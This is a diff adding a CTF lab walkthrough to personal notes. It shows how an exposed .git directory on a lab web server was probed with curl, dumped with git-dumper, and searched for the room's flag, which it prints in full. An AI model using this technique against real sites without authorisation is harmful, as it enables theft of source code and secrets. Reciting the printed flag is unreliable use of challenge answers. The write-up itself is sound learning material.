@@ -184,6 +184,47 @@ Not visible on-page, but parsed from the streamed React payload:
 - **Lesson:** Never deploy the `.git` directory to a public web root — it lets anyone reconstruct full source (and secrets) via `git-dumper`.
 - **Notes:** Local dump saved at `C:\Users\varun\Desktop\room404_src` (contains `.git`, `app.js`, `index.html`, `README.md`).
 
+#### Walkthrough
+
+1. **Confirm connectivity to the lab machine** (VPN reachability from Kali-WSL):
+
+   ```bash
+   ping -c 3 10.144.176.152
+   curl -I http://10.144.176.152:8080
+   ```
+
+2. **Enumerate the web root.** The story hint ("the rooms it never lists") points at hidden/unlinked paths. Directory brute-forcing missed the dotfolder at first (SecLists wordlist was not present — installed later with `sudo apt install -y seclists`), so the `.git` directory was found by probing it directly:
+
+   ```bash
+   curl -s http://10.144.176.152:8080/.git/HEAD
+   # -> ref: refs/heads/master   (confirms an exposed Git repo)
+   ```
+
+3. **Dump the exposed repository** with `git-dumper`:
+
+   ```bash
+   pipx install git-dumper        # or: pip install git-dumper
+   git-dumper http://10.144.176.152:8080/.git/ room404_src
+   ```
+
+4. **Read the recovered source** — the flag was left in the staging `README.md` ("remove before launch"):
+
+   ```bash
+   grep -rniE 'thm\{' room404_src
+   # room404_src/README.md: Staging flag (remove before launch): THM{byt3_l0tus_n3v3r_f0rg3ts}
+   ```
+
+5. **Submit** `THM{byt3_l0tus_n3v3r_f0rg3ts}` in the room's "What is the flag?" box. ✅
+
+#### Recovered repo contents
+
+| File         | Purpose                                                            |
+| ------------ | ----------------------------------------------------------------- |
+| `README.md`  | Staging notes — **contained the flag**                            |
+| `index.html` | Guest-experience platform front page                              |
+| `app.js`     | Concierge personalization client script                           |
+| `.git/`      | Full version history that made the source recoverable             |
+
 ### Room 3 — Complimentary
 
 - **Status:** 🔒 Locked
